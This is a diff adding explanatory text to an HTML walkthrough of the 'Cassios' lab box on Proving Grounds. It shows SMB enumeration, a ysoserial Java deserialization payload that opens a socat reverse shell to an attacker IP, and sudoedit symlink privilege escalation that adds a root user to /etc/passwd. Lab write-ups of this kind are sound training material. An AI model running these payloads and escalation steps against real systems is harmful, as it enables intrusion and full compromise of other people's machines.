@@ -9,11 +9,15 @@ layout: default
 
 <body>
 
-    <h1>Cassio Walkthrough</h1>
+    <h1>Cassios Walkthrough</h1>
 
     <hr>
 
+    <p>Cassios is a relatively straightforward box.  It involves web enumeration and then exploiting java deserialization to obtain a reverse shell.  The privesc was two parts.  First finding the sudo ability and then finding the exploit for that specific sudo version and sudo ability.</p>
+
     <h2>Port Scanning</h2>
+
+    <li>We start off by running an nmap scan against all ports.</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios]
@@ -32,6 +36,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 33.57 seconds    
     </pre>
 
+    <li>We run another nmap scan.  This time we only target the open ports.  We also use the flags -sV and -sC to enumerate service versions and other information by using nmap scripts.</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios/nmap]
@@ -176,6 +181,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
     </pre>
 
+    <h2>Port 445</h2>
+
+    <p>We start off by taking a look at smb.  By using smbmap we are able to quickly see what shares exist and what permissions we have on those shares, while using an anonymous login.</p>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
@@ -187,6 +195,8 @@ Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
     Samantha Konstan                                    READ, WRITE Backups and Recycler files
     IPC$                                                NO ACCESS   IPC Service (Samba 4.10.4)
     </pre>
+
+    <p>It appears we have both read and write access to the share "Samantha Konstan".  I use smbmap to recursively download all the contents of this share. </p>
 
     <pre>
 ┌──(kali㉿kali)-[~/…/ProvingGrounds/Cassios/exfiltrated/SMB]
@@ -215,6 +225,9 @@ Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
 [+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\src\main\webapp\WEB-INF\web.xml
     </pre>
 
+    <p>I take a look through the share to see if I can find anything interesting.  One thing I always like to do is recursively search for the phrase "pass" and "password".  This search turns up nothing</p>
+
+    <li>grepping for "pass"</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
@@ -224,6 +237,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
 192.168.181.116-Samantha Konstan_resources.html:359:returns file system locations for a passed-in empty string (indicating
     </pre>
 
+    <li>I do find a readme.txt file which looks interestering.  We will want to take note of this and remember it for later.</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
@@ -250,6 +264,8 @@ Java Mantainer
     <h2>Port 80</h2>
 
     <img src="Cassio/port80.png">
+
+    <p>I start off with a gobuster search on port 80 to see which directories exist.  I first ran this scan with directory-list-2.3-medium.txt but that list missed the directory /backup_migrate.</p>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios]
@@ -344,7 +360,90 @@ main/resources/static/css/main.css:889:[type=color]:focus, [type=color]:active, 
 recycler.ser: Java serialization data, version 5
     </pre>
 
-    <p>It appears to be a Java serialization file.</p>
+    <p>It appears to be a Java serialization file.  Which would lead to me to believe we are looking at a Java deserialization reverse shell.  We will use ysoserial to create the malicious recycler.ser file.  Go to https://github.com/frohoff/ysoserial and scroll down the the Installation section where you will find a download link for ysoserial-master-SNAPSHOT.jar.  This is the file we will use.</p>
+
+    <p>Before we can use ysoserial to generate the malicious file, we need to know exactly which type of payload to generate.  We need to gather more information which is located in the SMB.  The file pom-bak.xml contains the line &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; which tells us to use commons-collections4 as the payload.  Now we are ready to generate our malicious recycler.ser file.</p>
+
+    <p>I tried a bunch of different methods to achieve a reverse shell.  This particular machine turns out to have socat on it.  So using socat was the easiest method of obtaining a reverse shell.</p>
+
+    <li>Generating the malicious recycler.ser file.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Cassios]
+└─$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "socat tcp-connect:192.168.49.231:80 exec:/bin/sh,pty,stderr,setsid,sigint,sane" > recycler.ser
+    </pre>
+
+    <li>Setting up my socat listener on port 80</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/…/ProvingGrounds/Cassio/exfiltrated/SMB]
+└─$ socat file:`tty`,raw,echo=0 tcp-listen:80
+    </pre>
+
+    <p>Now we need to upload our malicious recycler.ser to the SMB share.  Then go to the dashboard app.  Click on "Check Status" to read the recycler.ser file from the SMB share.  We should have a reverse shell now.</p>
+
+    <li>Getting reverse shell.  Also upgrading shell to pty and giving myself the ability to use the "clear" command.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
+&#x2514;&#x2500;$ socat file:`tty`,raw,echo=0 tcp-listen:80
+sh-4.2$ id
+uid=1000(samantha) gid=1000(samantha) groups=1000(samantha)
+sh-4.2$ python -c &quot;import pty;pty.spawn(&#039;/bin/bash&#039;);&quot;
+[samantha@cassios /]$ export TERM=xterm
+    </pre>
+
+    <p>The first thing I do is check sudo -l.  I find out that I have a sudo ability as Samantha.  I was not able to find a way to exploit this so I end up running linpeas.sh.  After running linpeas I find that the sudo version is 1.8.14.  Searchsploit turns up an exploit for this sudo version which directly relates to the sudo ability we have as Samantha on this machine.</p>
+
+    <li>Checking sudo -l</li>
+
+    <pre>
+[samantha@cassios /]$ sudo -l
+Matching Defaults entries for samantha on cassios:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR
+    KDEDIR"
+
+User samantha may run the following commands on cassios:
+    (root) NOPASSWD: sudoedit /home/*/*/recycler.ser
+    </pre>
+
+    <li>Searchsploit results for sudo version 1.8.14</li>
+    
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios]
+&#x2514;&#x2500;$ searchsploit sudo 1.8.14                                                      
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - &#039;Sudoedit&#039; Unauthorized Privilege Escalation   | linux/local/37710.txt
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+    </pre>
+
+    <p>The exploit says that if we create a symbolic link file to the location of where our sudo ability "sudoedit" points to then we can get sudo rights to edit any file we choose.  I choose to edit /etc/passwd so I can add another root user.</p>
+
+    <li>Creating symbolic link file</li>
+
+    <pre>
+[samantha@cassios backups]$ pwd
+/home/samantha/backups
+[samantha@cassios backups]$ ln -s /etc/passwd recycler.ser
+    </pre>
+
+    <li>Running sudo command to edit /etc/passwd</li>
+    <pre>
+[samantha@cassios backups]$ sudoedit -u root /home/*/*/recycler.ser
+    </pre>
+
+    <p>Towards the bottom of /etc/passwd I add the line "root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash".  This creates a new root user named root2 with the password set to be "root".  Save the file.  Now we can use "su root2" and login with the password "root" and we have a root shell.
+
+    <pre>
+[samantha@cassios backups]$ su root2
+Password: 
+[root@cassios backups]# id
+uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+
 
 
 </body>
